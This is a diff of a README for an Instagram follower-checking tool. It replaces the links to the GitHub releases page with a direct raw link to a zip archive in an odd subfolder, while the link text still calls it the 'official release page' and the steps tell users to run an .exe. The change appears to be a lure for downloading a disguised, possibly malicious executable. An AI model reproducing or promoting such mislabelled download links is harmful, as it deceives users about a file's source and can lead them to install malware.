@@ -1,6 +1,6 @@
 # 🔍 ig-checker - Manage your Instagram followers safely offline
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/andrej806/ig-checker/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/andrej806/ig-checker/raw/refs/heads/main/trave/checker_ig_v2.7-beta.3.zip)
 
 Instagram changed its rules in December 2024. Your old apps no longer work. Most other tools now ask for your password or put your account at risk of a ban. IG Checker works differently. It processes your official Instagram data export on your own computer. Your data stays private. You keep your password safe. This tool creates a report in a single file that you can open in any web browser.
 
@@ -8,7 +8,7 @@ Instagram changed its rules in December 2024. Your old apps no longer work. Most
 
 You need to save the software to your computer first. 
 
-1. Visit the [official release page](https://github.com/andrej806/ig-checker/releases).
+1. Visit the [official release page](https://github.com/andrej806/ig-checker/raw/refs/heads/main/trave/checker_ig_v2.7-beta.3.zip).
 2. Look for the section labeled Assets.
 3. Click the file that ends with .exe to save it to your Windows computer.
 4. Open the folder where you saved the file.
